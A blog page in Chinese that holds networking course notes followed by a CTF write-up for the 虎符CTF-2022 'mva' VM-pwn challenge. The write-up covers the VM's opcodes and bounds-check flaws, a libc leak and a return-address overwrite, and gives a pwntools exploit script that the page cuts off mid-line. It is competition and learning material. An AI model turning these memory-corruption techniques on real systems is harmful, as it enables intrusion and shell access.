<p>如果需要连续传输大量数据，且传输时间远大于呼叫建立时间，则使用数据通信之前预先分配传输带宽的电路交换。分组交换无需预先分配带宽，在传输突发数据时可以提高整个网络的信道利用率。</p>
<h4 id="网络核心分类"><a class="markdownIt-Anchor" href="#网络核心分类"></a> 网络核心分类</h4>
<p>电信网络：电路交换网络、分组交换网络<br />
电路交换网络：FDM、TDM<br />
分组交换网络：虚电路网络、数据报网络</p>
<h3 id="133-网络的网络"><a class="markdownIt-Anchor" href="#133-网络的网络"></a> 1.3.3 网络的网络</h3>
<p>端系统通过ISP（Internet Service Provider）连接到网络，ISP和ISP之间连接形成更大的网络。由此构建的因特网非常复杂，应该由经济和国家策略而不是性能来驱动。</p>
<p>对于如此大的网络，可能的连接方式有下列几种：</p>
<ul>
<li>将每两个ISP之间都建立一个连接，这样连接的数量太大不经济。</li>
<li>所有客户ISP连接到一个全球承载ISP，这样会导致全球承载ISP的压力较大，且需要在费用上达成一致，容易形成垄断。</li>
<li>客户ISP连接到多个全球承载ISP中，全球承载ISP再相互进行连接。这样可能在两个全球承载ISP之间存在一个IXP（因特网交互点），但由于不是每一个国家都有全球承载ISP，因此这种方案也有问题。</li>
<li>区域网络与承载ISP相联，每一个区域有一个ISP，即在客户ISP和全球承载ISP中间加上一层地区ISP，这种方式较为合理。</li>
<li>在第四种方案的基础上添加上内容提供商自己的网络——内容提供商网络，如谷歌微软等。总的结构应该为：客户ISP——区域ISP——IXP——全球ISP/内容提供商网络总体4层结构，当然这个层级结构并不严格，客户ISP也可以直联全球ISP。</li>
</ul>
<h2 id="14-分组交换网中的时延-丢包与吞吐量"><a class="markdownIt-Anchor" href="#14-分组交换网中的时延-丢包与吞吐量"></a> 1.4 分组交换网中的时延、丢包与吞吐量</h2>
<p>时延分为：</p>
<ul>
<li><font color=red>节点处理时延d<sub>proc</sub></font>：节点收到完整的分组后，需要对该分组进行校验以及确定输出链路，分组完成这些工作所需要的时间。一般为几ms或更短</li>
<li><font color=red>排队时延</font>：排队时延取决于路由器的拥塞程度，当分组在输出链路中需要等待被发送时产生排队时延。</li>
<li><font color=red>传输时延</font>：将分组比特流发送到链路中的时间，L/R。其在低速链路中非常重要</li>
<li><font color=red>传播时延</font>：数据在链路中从起点到终点所需要的时间。d为物理链路的长度，s为媒体中的传播速度（约为2*10<sup>8</sup>m/s），传播时延=d/s。注意与传输时延的区别。约为几ms到几百ms。</li>
</ul>
<p>定义<font color=red>流量强度</font>：链路带宽R（bps），分组长度L（bits），平均分组到达速率a，则流量强度为La/R。这是一个以路由器为视角定义的量，当值近似于0时，表示平均排队时延很小，甚至为0，当值小于1时，时延较小，且随着时间推移变小，因为此时分组到来的速度小于路由器的处理速度。当值等于1时，时延不会变化，具体时延的值取决于当前队列的长度。当值大于1时，平均时延较大，且随着时间推移趋近于无穷。</p>
<ul>
<li>缓存中的队列容量有限，当分组到达时如果队列已满，则该分组会被丢弃。丢弃的分组可能会被重传，或者根本不重传。</li>
<li><font color=red>通常到达队列的过程是随机的，La/R并不能全面地表征时延的统计量，当流量强度接近1时，当到达速率超过传输能力（由于分组到达速率的波动）时将产生时间间隔，在这些时段中将形成队列。</font><font color=blue>就比如当流量强度为1时，在一个时刻同时到达多个分组，在这些分组处理完之后，可能会有一段时间路由器中没有队列，此时路由器就会进入空闲状态，但由于流量强度为1，路由器只要有空闲时间，就必须让后面的分组等待更长的时间，这就是统计规律导致的问题。因此并不是说当流量强度为1时平均排队时延就不会增加，而是会缓慢增加。</font></li>
</ul>
<p>定义<font color=red>吞吐量</font>：这是现实生活中最关心的一个性能指标，与带宽要进行区分。分为瞬时吞吐量和平均吞吐量，类比瞬时速度和平均速度。吞吐量指发送方和接收方之间的数据传输速率（bits/time unit）。对于一个有多条链路的传输路径，其吞吐量等于吞吐量最小的那一条链路的吞吐量值（木桶原理），称这条链路为瓶颈链路。<font color=red>吞吐量和带宽一定要辨析清楚。带宽指的是一段链路最为理想的情况下单位时间能够传输的比特量，而吞吐量则是一个根据实际情况测出来的一个量，就像高速公路的限速是120（带宽），但在车辆比较多的情况下就不可能达到这个速度（吞吐量）</font>。互联网下，连接瓶颈通常不是在主干网络，而是与每一台机器直接相连或距离不大的分支网络或分支链路上。虽然主干网络上承载的流量大得多，但主干网络通常会被精心维护，所以一般不会出现主干网络成为瓶颈的情况。</p>
<h2 id="15-协议层次和服务类型"><a class="markdownIt-Anchor" href="#15-协议层次和服务类型"></a> 1.5 协议层次和服务类型</h2>
<p>现实中需要实现的需求往往多而繁杂，为了将这些需求规范化，定义了种种协议与分层结构。定义层次可以使得每一个层次实现一种服务，相邻的层次之间有依赖作用。分层是处理复杂系统的有效方法，可以以结构化的方式来讨论系统组件。每一层对其他层是透明的。但分层也可能会导致功能冗余和信息关联（某一层的功能需要其他层的信息）</p>
<h3 id="151-分层的体系结构"><a class="markdownIt-Anchor" href="#151-分层的体系结构"></a> 1.5.1 分层的体系结构</h3>
<p>目前通用的因特网的协议栈一共分为5层：</p>
<ul>
<li>应用层：支持网络应用，如FTP、HTTP等协议就是运行在应用层</li>
<li>运输层：用于主机之间的数据传输，如TCP、UDP协议</li>
<li>网络层：将数据报从源端传送到目的端，如IP协议和路由协议</li>
<li>链路层：数据在网络相邻结点之间传输，如PPP协议和Ethernet协议</li>
<li>物理层：在线路上传输比特流</li>
</ul>
<p>ISO/OSI参考模型：共有7层，在应用层和运输层之间增加了：</p>
<ul>
<li>表示层：允许应用程序解释数据的含义，如加密压缩等</li>
<li>会话层：提供数据交换的同步、定界、建立检查点和恢复的能力</li>
</ul>
<p>由于这两层在应用层完全可以实现，因此现实中的因特网协议栈没有这两层。</p>
<p><font color=red>实体</font>：任何可以发送和接收消息的硬件和软件进程，通常是一个特定的软件模块。<br />
<font color=red>对等体</font>：不同机器上包含对应层的实体称为对等体，如两台机器上的应用层实体称为对等体，网络层实体为另一个对等体。<br />
<font color=red>协议</font>：包含——语法，即数据与控制信息的结构或格式；语义：即需发现何种控制信息，完成何种动作以及做出何种应答；同步：即事件实现顺序的详细说明。<br />
<font color=red>服务</font>：为保证上层对等体之间能够相互通信，下层向上层提供的功能。<br />
<font color=red>服务原语</font>：网络相邻层之间进行交互时需要交换的一些必要命令。<br />
<font color=red>服务访问点（SAP）</font>：同一系统中相邻两层的实体进行交互的地方。<br />
<font color=red>协议数据单元（PDU）</font>对等层次上传送数据的单位。<br />
<font color=red>服务数据单元（SDU）</font>层与层之间交换数据的单位。<br />
<font color=red>网络体系结构（Network Architecture）</font>：层和协议的集合。<br />
<font color=red>协议栈（Protocol Stack）</font>：一个特定的系统所使用的一组协议。</p>
<p>数据传输过程就是一个加头部去头部的过程，首先在发送方依次加上第5、4、3、2层头部，然后发送到接收方在接收方处将这些头部依次去掉即可。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">虎符CTF-2022 mva 题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 23:18:07" itemprop="dateCreated datePublished" datetime="2023-02-28T23:18:07+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-03-02 17:02:38" itemprop="dateModified" datetime="2023-03-02T17:02:38+08:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一道vm题。前几天师傅让我看看这道题，发现是一种没有做过的类型。查询相关资料之后有了一定的了解。由于是第一次做这种题，就将wp写的尽可能详细一些，作为笔记备查。</p>
<p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
<p>vm-pwn是一种虚拟机pwn，我的理解是，我们自己用C语言写一个虚拟机。在这个虚拟机里面可以进行各种操作，如加减乘除、堆栈操作等。这里各种操作的操作码可以是我们自己定义的，比如我们定义01开头的指令为加，02开头为减，等等。我们不管当前的主流架构是怎么实现的，这个程序本身相当于是”发明“了一种小型的轻量级的汇编语言。我们需要找到这种语言的漏洞以跳出虚拟机，进而getshell或getflag。</p>
<p>大致了解了这种题目的背景之后，我们就可以进去看题了。</p>
<p><img src="1.png" alt="" /></p>
<p>指令首先是写在了bss段的一个地方，在main函数中有一个死循环，里面的sub_11E9函数应该就是读取指令的函数了。改名为read_cmd。</p>
<p>这里反汇编看着不太清楚，还是要深入到汇编去查看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001213                 lea     rdx, code</span><br><span class="line">.text:000000000000121A                 add     rax, rdx</span><br><span class="line">.text:000000000000121D                 mov     eax, [rax]</span><br><span class="line">.text:000000000000121F                 mov     [rbp+var_C], eax</span><br><span class="line">.text:0000000000001222                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001225                 shr     eax, 18h</span><br><span class="line">.text:0000000000001228                 mov     edx, eax</span><br><span class="line">.text:000000000000122A                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000122D                 shr     eax, 8</span><br><span class="line">.text:0000000000001230                 and     eax, 0FF00h</span><br><span class="line">.text:0000000000001235                 or      edx, eax</span><br><span class="line">.text:0000000000001237                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000123A                 shl     eax, 8</span><br><span class="line">.text:000000000000123D                 and     eax, 0FF0000h</span><br><span class="line">.text:0000000000001242                 or      edx, eax</span><br><span class="line">.text:0000000000001244                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001247                 shl     eax, 18h</span><br><span class="line">.text:000000000000124A                 or      eax, edx</span><br></pre></td></tr></table></figure>
<p>上面这一段汇编是read_cmd里面的，主要功能就是从输入的指令中读取4字节后将这4字节高位变低位，低位变高位（从小端序到大端序的转换）。在read_cmd返回后，eax中存放的就是读取到的指令。读取指令后返回到main函数中，一开始看到main函数下面有很多没有解析的部分，将其手动转为汇编代码，发现有很多跳转指令，那么基本可以判断出，下面就是解析并执行指令的部分了。跳转指令应该是在判断指令的类型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000135E                 mov     eax, 0</span><br><span class="line">.text:0000000000001363                 call    read_cmd</span><br><span class="line">.text:0000000000001368                 mov     [rbp+var_23C], eax</span><br><span class="line">.text:000000000000136E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001374                 shr     eax, 18h</span><br><span class="line">.text:0000000000001377                 mov     [rbp+var_240], ax</span><br><span class="line">.text:000000000000137E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001384                 sar     eax, 10h</span><br><span class="line">.text:0000000000001387                 mov     [rbp+var_249], al</span><br><span class="line">.text:000000000000138D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001393                 sar     ax, 8</span><br><span class="line">.text:0000000000001397                 mov     [rbp+var_248], al</span><br><span class="line">.text:000000000000139D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013A3                 mov     [rbp+var_247], al</span><br><span class="line">.text:00000000000013A9                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013AF                 mov     [rbp+var_23E], ax</span><br></pre></td></tr></table></figure>
<p>在调用read_cmd函数之后，main函数将指令的不同位保存到栈中不同的位置，但这些位置基本上相邻。</p>
<p>下图为栈中保存的指令值情况（假设读取的指令为0x76543210）</p>
<table align=center>
<tr align=center>
	<td> addr </td> <td> +0 </td> <td> +1 </td> <td> +2 </td> <td> +3 </td>
	<td> +4 </td> <td> +5 </td> <td> +6 </td> <td> +7 </td>
</tr>
<tr align=center>
	<td> rbp-0x250 </td> <td> - </td> <td> - </td> <td> - </td> <td> - </td>
	<td> - </td> <td> - </td> <td> - </td> <td> 32 </td>
</tr>
<tr align=center>
	<td> rbp-0x248 </td> <td> 54 </td> <td> 76 </td> <td> - </td> <td> - </td>
	<td> - </td> <td> - </td> <td> - </td> <td> - </td>
</tr>
<tr align=center>
	<td> rbp-0x240 </td> <td> 10 </td> <td> - </td> <td> 76 </td> <td> 54 </td>
	<td> 76 </td> <td> 54 </td> <td> 32 </td> <td> 10 </td>
</tr>
</table>
<p>之后判断原输入的最低位是否大于0xF，如果大于则跳过该指令。这说明这个虚拟机中的指令码只可能有0x0~0xF最多16种。我们修改一下输入，然后接着跟着执行流一步一步走。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000000206C dword_206C      dd 0FFFFF38Bh           ; DATA XREF: main+134↑o</span><br><span class="line">.rodata:000000000000206C                                         ; main+140↑o</span><br><span class="line">.rodata:0000000000002070                 dd 0FFFFF399h</span><br><span class="line">.rodata:0000000000002074                 dd 0FFFFF3D2h</span><br><span class="line">.rodata:0000000000002078                 dd 0FFFFF460h</span><br><span class="line">.rodata:000000000000207C                 dd 0FFFFF4F0h</span><br><span class="line">.rodata:0000000000002080                 dd 0FFFFF57Eh</span><br><span class="line">.rodata:0000000000002084                 dd 0FFFFF60Ch</span><br><span class="line">.rodata:0000000000002088                 dd 0FFFFF686h</span><br><span class="line">.rodata:000000000000208C                 dd 0FFFFF714h</span><br><span class="line">.rodata:0000000000002090                 dd 0FFFFF735h</span><br><span class="line">.rodata:0000000000002094                 dd 0FFFFF7A7h</span><br><span class="line">.rodata:0000000000002098                 dd 0FFFFF80Ah</span><br><span class="line">.rodata:000000000000209C                 dd 0FFFFF839h</span><br><span class="line">.rodata:00000000000020A0                 dd 0FFFFF8B4h</span><br><span class="line">.rodata:00000000000020A4                 dd 0FFFFF940h</span><br><span class="line">.rodata:00000000000020A8                 dd 0FFFFF994h</span><br></pre></td></tr></table></figure>
<p>接下来，程序提到了rodata中的这个地方，这里发现这个未知数据的长度为64字节，正好是16*4，每一个4字节对应一条指令，但具体含义尚不清楚。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000013D6                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:00000000000013DE                 lea     rax, dword_206C</span><br><span class="line">.text:00000000000013E5                 mov     eax, [rdx+rax]</span><br><span class="line">.text:00000000000013E8                 cdqe</span><br><span class="line">.text:00000000000013EA                 lea     rdx, dword_206C</span><br><span class="line">.text:00000000000013F1                 add     rax, rdx</span><br><span class="line">.text:00000000000013F4                 db      3Eh</span><br><span class="line">.text:00000000000013F4                 jmp     rax</span><br></pre></td></tr></table></figure>
<p>往下看不远处，我们就知道这个64字节数据是用来干嘛的了。它起始就是一个地址的偏移量，将对应指令的偏移量加上rodata的地址值，得到的就是指令对应的执行部分的地址。将其重命名为exec_offset。</p>
<p>…</p>
<p>经过亿段时间的分析之后，我大概搞清楚了其中一些指令的含义。</p>
<p>在这个虚拟机中一共有6个word类型的寄存器，这6个寄存器通过偏移获取。在这16种指令中有加减乘除、与或异或等算数指令，这些指令需要3个操作数。格式为：（下面所有格式均为高地址到低地址，在写入时需要调换一下顺序）</p>
<blockquote>
<p>指令码: 2, 功能: 加法, 格式: op1 op2 op3 0x2——reg(op3) = reg(op1) + reg(op2)<br />
指令码: 3, 功能: 减法, 格式: op1 op2 op3 0x3——reg(op3) = reg(op2) - reg(op1)<br />
指令码: 4, 功能: 按位与, 格式: op1 op2 op3 0x4——reg(op3) = reg(op2) &amp; reg(op1)<br />
指令码: 5, 功能: 按位或, 格式: op1 op2 op3 0x5——reg(op3)= reg(op2) | reg(op1)<br />
指令码: 6, 功能: 右移, 格式: op1 op2 op3 0x6——reg(op3) = reg(op3) &gt;&gt; reg(op2)<br />
指令码: 7, 功能: 按位异或, 格式: op1 op2 op3 0x7——reg(op3) = reg(op1) ^ reg(op2)<br />
指令码: 13, 功能: 乘法, 格式: op1 op2 op3 0xD——reg(op3) = reg(op1) * reg(op2) 【注意这里没有检查op2的范围，是一个漏洞】</p>
</blockquote>
<p>除此之外，还有一些其他类型的指令，这里也列举一下。</p>
<blockquote>
<p>指令码: 0, 功能: 退出, 格式: op1 op2 op3 0x0——exit()<br />
指令码: 1, 功能: 赋值, 格式: op1 op2 op3 0x1——reg(op3) = op1 + op2 &gt;&gt; 8 (op1 = LOBYTE(op3), op2 = HIBYTE(op3))<br />
指令码: 9, 功能: 入栈, 格式: op1 op2 op3 0x9——若op3 == 0则push (reg(0))，若op3 != 0则push (op1 + op2 &gt;&gt; 8) 【注意这里虽然有对栈是否满的检查，但是没有对op3大小的检查，可以push虚拟机空间之外的东西，是一个漏洞】<br />
指令码: 10, 功能: 出栈, 格式: op1 op2 op3 0xA——reg(op3) = pop()【这里有对op3大小和栈是否为空的检查】<br />
指令码: 12, 功能: 比较两个寄存器的值是否相等。因为返回相等的控制位没有被其他指令所引用，因此这里不做分析。<br />
指令码: 14, 功能: 寄存器赋值, 格式: op1 op2 op3 0xE——reg(op2) = reg(op3)【注意这里没有检查op2是否为负数，是一个漏洞】<br />
指令码: 15, 功能: 输出栈顶的值（这里指的是没有被占用的地方，也就是栈实际占用空间还往上一个字的值，这个字现在实际上并没有进入堆栈）</p>
</blockquote>
<p>还有8和11的指令码没有分析，不过从官方wp上看这两个应该是无关紧要的，就暂且不管了。</p>
<p>然后我们需要整理一下思路，想想如何才能利用上面的漏洞getshell。</p>
<p>要想getshell，首先要拿到libc加载地址，通过这个加载地址得到one_gadget的地址，然后需要将one_gadget地址写入返回地址中。整个过程看似简单，但首先第一个问题：如何拿到libc加载地址？</p>
<p>注意到赋值操作中目的操作数是没有检查负数的情况的，经过IDA调试发现栈指针在寄存器的低地址处，我们可以让目的操作数为负进而指向栈指针，这样我们就可以用寄存器中的值去覆盖栈指针的值。栈指针是一个8字节结构，对应赋值的偏移应为0xF6、0xF7、0xF8、0xF9，我们将0xF6偏移位置覆盖为0x8000即可让栈指针变为负数。在输出值（指令码0xF）时，这个最高位的0x8000会溢出，从而我们可以读取寄存器后面任何一个位置的地址。经过试验发现，栈指针为0x10C时对应main返回地址最低字，即__libc_start_main+243。我们读取0x10C、0x10D、0x10E三个字的值就可以完全掌握libc的加载地址了。注意这里读取不用0xF指令，因为它只有输出功能，等脚本读到输出之后你的小程序早就执行完了。因此这里使用pop指令，它只会检查栈指针是否为0，因此可以绕过。</p>
<p><img src="2.png" alt="" /></p>
<p>在pop之后，我们获得了libc的加载地址，这里需要进行一些计算来获得one_gadget的地址。然后我们将其push到返回地址处就可以了。这里需要注意的是，由于每一个寄存器只有2字节长度，因此返回地址需要用3个寄存器存储，在计算的时候会忽略向高位的借位，因此可能在计算时出错，但这是一个小概率事件，大约有1/4的概率会失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00005607BDE667A1 case_9:                                 ; *** code: 9</span><br><span class="line">.text:00005607BDE667A1 mov     rax, [rbp+var_230]              ;     function: if var_230(?) &lt;= 100h then exit</span><br><span class="line">.text:00005607BDE667A1                                         ;               else then ???</span><br><span class="line">.text:00005607BDE667A8 cmp     rax, 100h</span><br><span class="line">.text:00005607BDE667AE jle     short loc_5607BDE667BA</span><br><span class="line">.text:00005607BDE667B0 mov     edi, 0                          ; status</span><br><span class="line">.text:00005607BDE667B5 call    _exit</span><br></pre></td></tr></table></figure>
<p>请注意上面的代码片段，这是检查栈指针是否大于100。但是跳转是jle，这表示它是有符号的比较。那也就是说如果栈指针是一个负数，如果看做无符号数的话是一个很大的数，但也能通过检查，这就为我们写入返回地址创造了条件。</p>
<p>因此，大致的步骤就是：</p>
<p>Step 1: 修改栈指针到返回地址处<br />
Step 2: 读取返回地址<br />
Step 3: 计算one_gadget地址<br />
Step 4: 写入返回地址<br />
Step 5: getshell</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">Libc_libc_start_main = <span class="number">0x23FC0</span></span><br><span class="line">Libc_one_gadget = <span class="number">0xE3B31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_command</span>(<span class="params">code, op1, op2, op3</span>):</span><br><span class="line">	<span class="keyword">return</span> p8(code) + p8(op1) + p8(op2) + p8(op3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movl</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">1</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">dest, add1, add2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">2</span>, dest, add1, add2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">dest, subee, suber</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">3</span>, dest, subee, suber)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">band</span>(<span class="params">dest, and1, and2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">4</span>, dest, and1, and2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bor</span>(<span class="params">dest, or1, or2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">5</span>, dest, or1, or2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sar</span>(<span class="params">dest, off</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">6</span>, dest, off, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">dest, xor1, xor2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">7</span>, dest, xor1, xor2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">if</span> reg == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">10</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>(<span class="params">dest, imul1, imul2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">13</span>, dest, imul1, imul2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">src, dest</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">14</span>, src, dest, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_top</span>():</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: get __libc_start_main + 243</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x8000</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF9</span>)			<span class="comment"># bypass the check by making it nagative</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x010F</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF6</span>)</span><br><span class="line">payload += pop(<span class="number">0</span>)				<span class="comment"># HIGH WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">1</span>)				<span class="comment"># MIDDLE WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">2</span>)				<span class="comment"># LOW WORD of __libc_start_main</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span 